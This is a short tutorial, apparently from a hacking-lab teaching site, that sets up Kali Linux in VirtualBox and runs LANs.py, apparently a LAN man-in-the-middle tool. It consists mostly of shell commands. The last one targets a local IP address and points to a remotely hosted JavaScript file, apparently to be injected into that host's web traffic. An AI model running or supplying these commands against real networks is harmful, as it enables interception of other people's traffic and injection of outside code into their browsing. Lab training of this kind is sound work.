Boot / Install Kali

If on virtualbox, you will need a USB wifi stick. Once added, click the usb icon in the bottom right and add the device to your guest OS
![](http://teachthe.net/topclipbox/2016-05-03_22-29-253QLRLY.png)

NOTE - Your network should be in Bridged Adapter mode.

SETUP
```
git clone https://github.com/breakthenet/LANs.py.git
cd LANs.py
apt-get install python-pip
pip install -r requirements.txt
```

Get Interface name
```
airmon-ng
```

Run script
```
python LANs.py -i wlan0
```

OR

```
python LANs.py -u -p -ip 192.168.0.100 -i wlan0 -b https://dl.dropboxusercontent.com/u/4238738/shake.js
```